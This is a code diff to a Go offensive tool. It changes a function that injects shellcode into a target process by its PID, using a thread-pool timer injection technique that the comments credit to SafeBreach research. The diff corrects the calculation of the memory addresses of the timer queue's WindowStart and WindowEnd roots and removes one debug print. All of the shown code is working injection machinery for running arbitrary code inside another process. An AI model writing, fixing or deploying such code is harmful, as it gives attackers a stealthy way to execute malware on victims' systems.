@@ -993,27 +993,21 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
 	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
 	// We already set tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
-	// So we calculate: Pool + offset(TimerQueue) + offset(AbsoluteQueue) + offset(WindowStart/WindowEnd) + offset(Root)
 	
 	targetTpPoolAddr := workerFactoryInfo.StartParameter
 	
-	// Calculate offsets
+	// Calculate offsets - use dummy structure for offset calculation
 	var dummyPool FULL_TP_POOL
-	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
-	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue))
-	windowStartOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowStart))
-	windowEndOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowEnd))
 	
-	// WindowStart.Root and WindowEnd.Root are at the beginning of TPP_PH (first field)
-	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
-	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
+	// These offsets are relative to the start of FULL_TP_POOL
+	windowStartRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowStart))
+	windowEndRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowEnd))
 
 	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
 	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
 	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
 
 	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
-	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X\n", timerQueueOffset)
 	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
 	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
 	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
